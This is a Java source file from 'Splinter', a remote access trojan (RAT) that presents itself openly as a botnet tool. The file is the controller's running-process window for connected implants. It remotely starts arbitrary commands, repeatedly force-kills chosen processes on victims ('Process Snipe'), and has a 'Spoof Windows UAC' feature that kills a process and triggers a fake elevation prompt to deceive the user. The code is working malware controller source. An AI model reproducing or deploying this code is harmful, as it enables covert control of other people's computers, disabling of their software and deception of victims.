/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package RunningProcess;

import Controller.Drivers.Drivers;
import Controller.GUI.JTable_Solomon;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Container;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.ArrayList;
import java.util.Vector;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.Timer;
import javax.swing.UIManager;
import javax.swing.border.TitledBorder;

public class Frame_RunningProcessList extends JFrame
  implements ActionListener
{
  String strMyClassName = "Frame_RunningProcessList";

  JPanel jpnlMain = new JPanel(new BorderLayout());
  JPanel jpnlOverhead = new JPanel(new BorderLayout());
  public JLabel jlblConnectedAgentInfo = null;
  JLabel jlblRunningProcessListAsOf = new JLabel("Running Process List", 0);

  JCheckBox jcbPauseUpdate = new JCheckBox("Pause Update", false);

  public JTable_Solomon jtblProcessList = null;
  public static final String[] arrJTableProcessListColNames = { "Image Name", "PID", "Session Name", "Session#", "Mem Usage", "Status", "User Name", "CPU Time", "Window Title" };
  public static Vector<String> vctJTableProcessListColNames = new Vector(1, 1);
  public static Vector<String> vctJTableProcessListToolTips = new Vector(1, 1);

  Thread_Terminal myThread = null;

  int myLoadIndex = 0;

  public ArrayList<Node_RunningProcess> alCurrentDisplayedProcesses = new ArrayList();
  public ArrayList<Node_RunningProcess> alNewProcesses = new ArrayList();

  Timer tmrRefreshJTable = null;
  public volatile boolean processInterrupt_RefreshJTable = false;

  JPanel jpnlOptions = new JPanel(new BorderLayout(4, 4));
  JPanel jpnlFiler_Alignment = new JPanel(new BorderLayout());
  JLabel jlblFilterProcess = new JLabel("Filter Process: ", 4);
  JPanel jpnlFilter = new JPanel(new GridLayout(2, 9, 1, 1));
  JLabel jlblImageName = new JLabel("Image Name:", 0);
  JTextField jtfImageName = new JTextField(12);
  JLabel jlblPID = new JLabel("PID:", 0);
  JTextField jtfPID = new JTextField(12);
  JLabel jlblSessionName = new JLabel("Session Name:", 0);
  JTextField jtfSessionName = new JTextField(12);
  JLabel jlblSessionNum = new JLabel("Session #:", 0);
  JTextField jtfSessionNum = new JTextField(12);
  JLabel jlblMemUsage = new JLabel("Mem Usage:", 0);
  JTextField jtfMemUsage = new JTextField(12);
  JLabel jlblStatus = new JLabel("Status:", 0);
  JTextField jtfStatus = new JTextField(12);
  JLabel jlblUserName = new JLabel("User Name:", 0);
  JTextField jtfUserName = new JTextField(12);
  JLabel jlblCPU = new JLabel("CPU Time", 0);
  JTextField jtfCPU = new JTextField(12);
  JLabel jlblWindowTitle = new JLabel("Window Title:", 0);
  JTextField jtfWindowTitle = new JTextField(12);
  JCheckBox jcbEnabled_ProcessList = new JCheckBox("Enable Filter    ", false);

  JPanel jpnlOptions_Center = new JPanel(new BorderLayout(4, 4));

  JPanel jpnlPersistenKill = new JPanel(new BorderLayout());
  JLabel jlblPersistenKillProcess = new JLabel("           Process Snipe: ", 4);
  JTextField jtfPersistentKillProcess = new JTextField(20);
  JCheckBox jcbEnabled_ProcessKill = new JCheckBox("Engage Sniper", false);

  JPanel jpnlStartProcess = new JPanel(new BorderLayout());
  JLabel jlblStartProcess = new JLabel("             Start Process: ");
  JTextField jtfStartProcess = new JTextField(20);
  JButton jbtnStartProcess = new JButton("Start Process");

  JPanel jpnlWindowsUAC = new JPanel(new BorderLayout());
  JLabel jlblSpoofWindowsUAC = new JLabel(" Spoof Windows UAC: ");
  JTextField jtfSpoofWindowsUAC = new JTextField(20);
  JCheckBox jcbEnabled_UAC_Spoof = new JCheckBox("Engage Spoof", false);

  public volatile boolean filterEnabled_ProcessList = false;
  public volatile boolean filterEnabled_ProcessKill = false;
  public volatile boolean filterEnabled_WindowsUAC = false;

  String[] arrProcessList = null;
  String singleProcess = "";
  JTextField jtfToFilter = null;
  String token = "";
  boolean addProcessToJTable = false;

  public final int switch_imageNameVal = 0;
  public final int switch_pidVal = 1;
  public final int switch_sessionNameVal = 2;
  public final int switch_sessionNumVal = 3;
  public final int switch_memUsageVal = 4;
  public final int switch_statusVal = 5;
  public final int switch_userNameVal = 6;
  public final int switch_cpuTime = 7;
  public final int switch_windowTitle = 8;
  public final int switch_PersistentProcessKill = 9;
  public final int switch_WindowsUAC_Spoof = 10;

  JPanel jpnlFilterOption = new JPanel(new BorderLayout());
  JLabel jlblProcessFilterEnabled = new JLabel("   Process Filter Enabled   ", 0);
  JLabel jlblProcessKillEnabled = new JLabel("   Process Snipe Enabled   ", 0);
  JLabel jlblDismissUpdateEnabled = new JLabel("   Pause Updates Enabled   ", 0);
  JLabel jlblWindowsUACEnabled = new JLabel("  UAC Spoof Enabled ", 0);

  JPanel jpnlAlerts_Center = new JPanel(new BorderLayout());

  public Frame_RunningProcessList(int loadIndex, Thread_Terminal thread)
  {
    try
    {
      this.myThread = thread; this.myThread.frameRunningProcessIsDisposed = false;
      this.myLoadIndex = loadIndex;
      setTitle("Running Process List For Terminal @" + thread.getRHOST_IP());
      try
      {
        setIconImage(Drivers.imgFrameIcon); } catch (Exception localException1) {
      }
      try {
        this.myThread.pauseRunningProcessUpdate = false; } catch (Exception localException2) {
      }
      getContentPane().add(this.jpnlMain);

      this.jpnlMain.add("North", this.jpnlOverhead);

      setBounds(500, 200, 850, 550);

      this.jlblConnectedAgentInfo = new JLabel("Terminal is connected to " + thread.getJListData(), 0);
      this.jlblConnectedAgentInfo.setFont(new Font("Courier", 1, 18));
      this.jlblRunningProcessListAsOf.setFont(new Font("Courier", 1, 14));

      this.jpnlOverhead.add("North", this.jlblConnectedAgentInfo);

      this.jpnlOverhead.add("Center", this.jlblRunningProcessListAsOf);
      this.jpnlOverhead.add("East", this.jcbPauseUpdate);
      this.jpnlFilterOption.add("West", this.jlblProcessFilterEnabled);
      this.jpnlAlerts_Center.add("Center", this.jlblProcessKillEnabled);
      this.jpnlAlerts_Center.add("East", this.jlblWindowsUACEnabled);
      this.jpnlFilterOption.add("Center", this.jpnlAlerts_Center);
      this.jpnlFilterOption.add("East", this.jlblDismissUpdateEnabled);
      this.jlblProcessFilterEnabled.setOpaque(true);
      this.jlblProcessKillEnabled.setOpaque(true);
      this.jlblDismissUpdateEnabled.setOpaque(true);
      this.jlblWindowsUACEnabled.setOpaque(true);
      this.jlblProcessFilterEnabled.setBackground(Color.green.darker().darker());
      this.jlblProcessFilterEnabled.setForeground(Color.white);
      this.jlblProcessKillEnabled.setBackground(Color.red);
      this.jlblWindowsUACEnabled.setBackground(Color.BLACK);
      this.jlblWindowsUACEnabled.setForeground(Color.white);
      this.jlblProcessKillEnabled.setForeground(Color.white);
      this.jlblDismissUpdateEnabled.setBackground(Color.blue.darker());
      this.jlblDismissUpdateEnabled.setForeground(Color.white);
      this.jlblProcessKillEnabled.setVisible(false);
      this.jlblProcessFilterEnabled.setVisible(false);
      this.jlblDismissUpdateEnabled.setVisible(false);
      this.jlblWindowsUACEnabled.setVisible(false);
      this.jlblProcessFilterEnabled.setFont(new Font("Courier", 1, 14));
      this.jlblProcessKillEnabled.setFont(new Font("Courier", 1, 14));
      this.jlblDismissUpdateEnabled.setFont(new Font("Courier", 1, 14));
      this.jlblWindowsUACEnabled.setFont(new Font("Courier", 1, 14));
      this.jpnlOverhead.add("South", this.jpnlFilterOption);
      try
      {
        vctJTableProcessListColNames.clear();
        vctJTableProcessListToolTips.clear();
      }
      catch (Exception localException3) {
      }
      for (int i = 0; i < arrJTableProcessListColNames.length; i++)
      {
        vctJTableProcessListColNames.add(arrJTableProcessListColNames[i]);
        vctJTableProcessListToolTips.add(arrJTableProcessListColNames[i]);
      }

      this.jtblProcessList = new JTable_Solomon(vctJTableProcessListColNames, vctJTableProcessListToolTips, "RUNNING PROCESS LIST", Color.blue.darker(), null);
      this.jtblProcessList.clrDefaultBackground = Drivers.clrBackground;
      this.jtblProcessList.clrDefaultForeground = Drivers.clrImplant;

      this.jpnlMain.add("Center", this.jtblProcessList);

      this.jtblProcessList.jbtnDisconnectImplant.setVisible(false);
      this.jtblProcessList.jbtnGoogleMap.setVisible(false);
      try
      {
        this.jtblProcessList.tmrUpdateJTable.stop();
      }
      catch (Exception localException4) {
      }
      this.processInterrupt_RefreshJTable = false;
      this.tmrRefreshJTable = new Timer(100, this);
      this.tmrRefreshJTable.start();

      this.jtblProcessList.jbtnRefresh.setVisible(false);
      this.jtblProcessList.jcbEnableGPS_Resolution.setVisible(false);

      this.jpnlOptions.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Filter Options", 4, 2, null, new Color(0, 51, 255)));

      this.jpnlFilter.add(this.jlblImageName);
      this.jpnlFilter.add(this.jlblPID);
      this.jpnlFilter.add(this.jlblSessionName);
      this.jpnlFilter.add(this.jlblSessionNum);
      this.jpnlFilter.add(this.jlblMemUsage);
      this.jpnlFilter.add(this.jlblStatus);
      this.jpnlFilter.add(this.jlblUserName);
      this.jpnlFilter.add(this.jlblCPU);
      this.jpnlFilter.add(this.jlblWindowTitle);

      this.jpnlFilter.add(this.jtfImageName);
      this.jpnlFilter.add(this.jtfPID);
      this.jpnlFilter.add(this.jtfSessionName);
      this.jpnlFilter.add(this.jtfSessionNum);
      this.jpnlFilter.add(this.jtfMemUsage);
      this.jpnlFilter.add(this.jtfStatus);
      this.jpnlFilter.add(this.jtfUserName);
      this.jpnlFilter.add(this.jtfCPU);
      this.jpnlFilter.add(this.jtfWindowTitle);

      this.jpnlFiler_Alignment.add("Center", this.jpnlFilter);
      this.jpnlFiler_Alignment.add("East", this.jcbEnabled_ProcessList);

      this.jpnlPersistenKill.add("West", this.jlblPersistenKillProcess);
      this.jpnlPersistenKill.add("Center", this.jtfPersistentKillProcess);
      this.jpnlPersistenKill.add("East", this.jcbEnabled_ProcessKill);

      this.jpnlStartProcess.add("West", this.jlblStartProcess);
      this.jpnlStartProcess.add("Center", this.jtfStartProcess);
      this.jpnlStartProcess.add("East", this.jbtnStartProcess);

      this.jpnlWindowsUAC.add("West", this.jlblSpoofWindowsUAC);
      this.jpnlWindowsUAC.add("Center", this.jtfSpoofWindowsUAC);
      this.jpnlWindowsUAC.add("East", this.jcbEnabled_UAC_Spoof);

      this.jpnlOptions_Center.add("Center", this.jpnlPersistenKill);
      this.jpnlOptions_Center.add("South", this.jpnlWindowsUAC);

      this.jpnlOptions.add("North", this.jpnlFiler_Alignment);
      this.jpnlOptions.add("Center", this.jpnlOptions_Center);
      this.jpnlOptions.add("South", this.jpnlStartProcess);

      getContentPane().add("South", this.jpnlOptions);

      this.jcbEnabled_ProcessKill.addActionListener(this);
      this.jcbEnabled_ProcessList.addActionListener(this);
      this.jtfStartProcess.addActionListener(this);
      this.jbtnStartProcess.addActionListener(this);
      this.jcbPauseUpdate.addActionListener(this);
      this.jcbEnabled_UAC_Spoof.addActionListener(this);

      this.jlblPersistenKillProcess.setToolTipText("Persistent Kill Process");

      validate();
    }
    catch (Exception e)
    {
      Drivers.eop("Frame_RunningProcessList Constructor", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    setDefaultCloseOperation(0);

    addWindowListener(new WindowAdapter()
    {
      public void windowClosing(WindowEvent e)
      {
        Frame_RunningProcessList.this.myThread.closingRunningProcessFrame = true;
        Frame_RunningProcessList.this.closeFrame();
      }
    });
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.tmrRefreshJTable)
      {
        if (this.processInterrupt_RefreshJTable)
        {
          this.processInterrupt_RefreshJTable = false;
          refreshJTable();
          validate();
          this.jtblProcessList.validate();
        }

      }
      else if (ae.getSource() == this.jcbEnabled_ProcessKill)
      {
        this.filterEnabled_ProcessKill = this.jcbEnabled_ProcessKill.isSelected();
        this.jlblProcessKillEnabled.setVisible(this.filterEnabled_ProcessKill);
      }
      else if (ae.getSource() == this.jcbEnabled_ProcessList)
      {
        this.filterEnabled_ProcessList = this.jcbEnabled_ProcessList.isSelected();
        this.jlblProcessFilterEnabled.setVisible(this.filterEnabled_ProcessList);
      }
      else if (ae.getSource() == this.jcbPauseUpdate)
      {
        this.myThread.pauseRunningProcessUpdate = this.jcbPauseUpdate.isSelected();
        this.jlblDismissUpdateEnabled.setVisible(this.myThread.pauseRunningProcessUpdate);
      }
      else if (ae.getSource() == this.jcbEnabled_UAC_Spoof)
      {
        this.filterEnabled_WindowsUAC = this.jcbEnabled_UAC_Spoof.isSelected();
        this.jlblWindowsUACEnabled.setVisible(this.filterEnabled_WindowsUAC);
      }
      else if (ae.getSource() == this.jbtnStartProcess)
      {
        startProcess();
      }
      else if (ae.getSource() == this.jtfStartProcess)
      {
        startProcess();
      }

    }
    catch (Exception e)
    {
      Driver.eop("AE", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }
  }

  private boolean startProcess()
  {
    try
    {
      String cmd = this.jtfStartProcess.getText();
      if ((cmd == null) || (cmd.trim().equals("")))
      {
        Drivers.jop_Error("Empty Command received.  \nNo command to send!                      ", "Unable to completed selected action");
        return false;
      }

      if (Drivers.jop_Confirm("You have chosen to issue command: " + cmd.trim() + "\nDo you wish to continue?", "WARNING!!! DO you want to send command?") == 0)
      {
        this.myThread.sendCommand_RAW("start " + cmd);
        this.jtfStartProcess.setText("");
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("startProcess", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  private boolean filterProcessList(int switchVal, Node_RunningProcess processMap)
  {
    try
    {
      switch (switchVal)
      {
      case 0:
        this.jtfToFilter = this.jtfImageName;
        this.token = processMap.myImageName;

        break;
      case 1:
        this.jtfToFilter = this.jtfPID;
        this.token = processMap.myPID;

        break;
      case 2:
        this.jtfToFilter = this.jtfSessionName;
        this.token = processMap.mySessionName;

        break;
      case 3:
        this.jtfToFilter = this.jtfSessionNum;
        this.token = processMap.mySessionNumber;

        break;
      case 4:
        this.jtfToFilter = this.jtfMemUsage;
        this.token = processMap.myMemUsage;

        break;
      case 5:
        this.jtfToFilter = this.jtfStatus;
        this.token = processMap.myStatus;

        break;
      case 6:
        this.jtfToFilter = this.jtfUserName;
        this.token = processMap.myUserName;

        break;
      case 7:
        this.jtfToFilter = this.jtfCPU;
        this.token = processMap.myCPU_Time;

        break;
      case 8:
        this.jtfToFilter = this.jtfWindowTitle;
        this.token = processMap.myWindowTitle;

        break;
      case 9:
        this.jtfToFilter = this.jtfPersistentKillProcess;
        this.token = processMap.myImageName;

        break;
      case 10:
        this.jtfToFilter = this.jtfSpoofWindowsUAC;
        this.token = processMap.myImageName;
      }

      if ((this.jtfToFilter == null) || (this.token == null))
      {
        Driver.sop("Null Value Entered to filter in " + this.strMyClassName + " - Switch Val: " + switchVal + " ...skipping filter");
        return false;
      }

      if ((this.jtfToFilter.getText() != null) && (!this.jtfToFilter.getText().trim().equals("")))
      {
        this.arrProcessList = this.jtfToFilter.getText().trim().split(",");

        if ((this.arrProcessList != null) && (this.arrProcessList.length > 0))
        {
          for (int j = 0; j < this.arrProcessList.length; j++)
          {
            this.singleProcess = this.arrProcessList[j];

            if ((this.singleProcess != null) && (!this.singleProcess.trim().equals("")))
            {
              this.singleProcess = this.singleProcess.trim().toLowerCase();

              if ((this.singleProcess.startsWith("*")) && (this.singleProcess.endsWith("*")))
              {
                this.singleProcess = this.singleProcess.replace("*", "");

                if ((this.token != null) && (this.token.trim().toLowerCase().contains(this.singleProcess)))
                {
                  return true;
                }

              }

              if (this.singleProcess.startsWith("*"))
              {
                this.singleProcess = this.singleProcess.replace("*", "");

                if ((this.token != null) && (this.token.trim().toLowerCase().endsWith(this.singleProcess)))
                {
                  return true;
                }

              }

              if (this.singleProcess.endsWith("*"))
              {
                this.singleProcess = this.singleProcess.replace("*", "");

                if ((this.token != null) && (this.token.trim().toLowerCase().startsWith(this.singleProcess)))
                {
                  return true;
                }

              }

              if ((this.token != null) && (this.token.trim().equalsIgnoreCase(this.singleProcess)))
              {
                return true;
              }

            }

          }

        }

      }

    }
    catch (Exception e)
    {
      Driver.eop("filterProcessList", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  private boolean refreshJTable()
  {
    try
    {
      try
      {
        this.jtblProcessList.removeAllRows();
      } catch (Exception localException1) {
      }
      for (int i = 0; i < this.alCurrentDisplayedProcesses.size(); i++)
      {
        if (this.filterEnabled_ProcessList)
        {
          this.addProcessToJTable = false;

          this.addProcessToJTable |= filterProcessList(0, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i));
          this.addProcessToJTable |= filterProcessList(1, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i));
          this.addProcessToJTable |= filterProcessList(2, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i));
          this.addProcessToJTable |= filterProcessList(3, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i));
          this.addProcessToJTable |= filterProcessList(4, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i));
          this.addProcessToJTable |= filterProcessList(5, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i));
          this.addProcessToJTable |= filterProcessList(6, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i));
          this.addProcessToJTable |= filterProcessList(7, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i));
          this.addProcessToJTable |= filterProcessList(8, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i));

          if (this.addProcessToJTable)
          {
            this.jtblProcessList.addRow(((Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)).getRowData());
          }

          this.addProcessToJTable = false;
        }
        else
        {
          this.jtblProcessList.addRow(((Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)).getRowData());
        }

        if (this.filterEnabled_ProcessKill)
        {
          if (filterProcessList(9, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)))
          {
            Driver.sop("Process Found: [" + ((Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)).myImageName + "] in implant " + this.myThread.getJListData() + " sending kill command!");

            this.myThread.sendCommand_RAW("taskkill /f /im \"" + ((Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)).myImageName.trim() + "\"");
          }

        }

        if (this.filterEnabled_WindowsUAC)
        {
          if (filterProcessList(10, (Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)))
          {
            Driver.sop("UAC Spoof Enabled. Process Found: [" + ((Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)).myImageName + " PID: " + ((Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)).PID + "] in implant " + this.myThread.getJListData() + " spoofing UAC!");

            this.myThread.sendCommand_RAW("taskkill /f /pid  " + ((Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)).PID);

            this.myThread.sendCommand_RAW("SPOOF_UAC," + ((Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)).myImageName.trim() + ", " + ((Node_RunningProcess)this.alCurrentDisplayedProcesses.get(i)).myImageName.trim());

            this.jcbEnabled_UAC_Spoof.setSelected(false);
            this.filterEnabled_WindowsUAC = this.jcbEnabled_UAC_Spoof.isSelected();
            this.jlblWindowsUACEnabled.setVisible(this.filterEnabled_WindowsUAC);
          }

        }

      }

      this.jtblProcessList.sortJTable_ByRows(this.jtblProcessList.dfltTblMdl, this.jtblProcessList.jcbSortTableBy.getSelectedIndex(), this.jtblProcessList.sortInAscendingOrder);

      this.jlblRunningProcessListAsOf.setText("Last Update Received at " + Driver.getTimeStamp_Without_Date());

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("refreshJTable", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public void closeFrame()
  {
    try
    {
      if (this.myLoadIndex == 4)
      {
        this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%STOP_RUNNING_PS");
      }

      this.myThread.pauseRunningProcessUpdate = false;

      this.myThread.frameRunningProcessIsDisposed = true;
      setVisible(false);
      dispose();
    }
    catch (Exception e)
    {
      Drivers.eop("closeFrame", this.strMyClassName, e, e.getLocalizedMessage(), false);
      dispose();
    }
  }
}